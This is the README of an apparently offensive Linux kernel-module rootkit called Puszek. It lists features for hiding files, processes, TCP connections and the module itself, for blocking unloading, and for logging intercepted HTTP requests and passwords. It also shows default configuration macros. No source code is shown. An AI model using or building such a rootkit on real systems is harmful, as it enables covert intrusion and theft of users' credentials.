# Puszek  

rootkit for linux, works by modifying syscall table, it's a kernel module  
  
## warning: not done yet, list of features is below and what's more rootkit prints debug information to dmesg   
  
### features:  
  
1. hiding files with names ending on defined siffix (FILE_SUFFIX - ".rootkit" by default)  
2. hiding processes which cmdline contains defined text (COMMAND_CONTAINS - ".//./" by default)  
examples:  
.//./malicious_process  
wget http://cdimage.debian.org/debian-cd/8.5.0/amd64/iso-cd/debian-8.5.0-amd64-CD-1.iso .//./  
3. intercepting http (not https!) requests.  
all intercepted GET and POST http requests will be writen to /etc/http_requests[FILE_SUFFIX]  
when password is sent in request - it's written additionally to /etc/passwords[FILE_SUFFIX]  
4. rootkit module is invisible in 'lsmod' command, file /proc/modules, and directory /sys/module/  
5. unable to unload rootkit - rmmod: ERROR: Module rootkit is not currently loaded
6. hiding TCP connection of hidden process  

### default configuration:  
is in rootkit.c  

```C
//configuration  
#define FILE_SUFFIX ".rootkit"  
#define COMMAND_CONTAINS ".//./"  
#define ROOTKIT_NAME "rootkit"  
```

### tested on:  
```
Linux x 3.16.0-38-generic #52~14.04.1-Ubuntu SMP Fri May 8 09:43:57 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux  
```